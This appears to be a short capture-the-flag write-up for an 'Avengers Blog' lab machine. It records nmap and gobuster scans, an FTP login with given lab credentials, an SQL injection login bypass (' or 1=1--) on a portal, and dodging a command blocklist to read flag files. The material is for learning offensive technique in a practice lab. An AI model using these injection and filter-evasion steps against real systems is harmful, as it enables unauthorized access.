==Avengers Blog   Flutter Aug 14 2021==

IP 10.10.0.77

> export IP=10.10.0.77

## Enumeration ##

### Source code ###

Found dirs

	img/
	js/
	css/

Found hint line 189

	<script src="/js/script.js"></script> <!-- Hint -->

/js/script.js found cookies flag

### Dev Tools ###

Checking cookies under Storage tab found cookies flag as well

"GET http://$IP" response headers under Network tab contain flag

### Scanning ###

nmap -sV -sC -T5 -oN nmap_initial $IP

	21/tcp open  ftp     vsftpd 3.0.3

	22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	 ssh-hostkey: 
	   2048 b0:e5:59:ea:e7:88:c7:e0:69:30:0d:46:9f:20:75:c4 (RSA)
	   256 9d:80:60:d6:ac:c8:b2:aa:19:42:6d:56:fe:48:7c:a6 (ECDSA)
	   256 57:10:7a:e0:a2:f5:4f:d5:b7:7f:d7:e6:b4:c3:54:a5 (EdDSA)

	80/tcp open  http    Node.js Express framework
		http-title: Avengers! Assemble!


gobuster dir -u http://$IP -w directory-list-2.3-medium.txt -o gobuster_$IP

	/img (Status: 301)
	/home (Status: 302)
	/Home (Status: 302)
	/assets (Status: 301)
	/portal (Status: 200)
	/css (Status: 301)
	/js (Status: 301)
	/logout (Status: 302)
	/Portal (Status: 200)
	/HOME (Status: 302)
	/Logout (Status: 302)
	/stones (Status: 301)
	/PORTAL (Status: 200)

Logging in to ftp using given credentials groot:iamgroot

ftp> cd files

ftp> get flag3.txt

flag3.txt contains flag

### /portal ###

Trying SQLi with "' or 1=1--:' or 1=1--"
	
> Success


## RCE ##

whoami
	
	command disallowed

pwd

	/home/ubuntu/avengers

cd /; pwd
	
	/

> oh so that works

ls /home
	
	groot and ubuntu

ls /home/ubuntu
	
	flag5.txt

cat flag5.txt fails

less flag5.txt returns flag
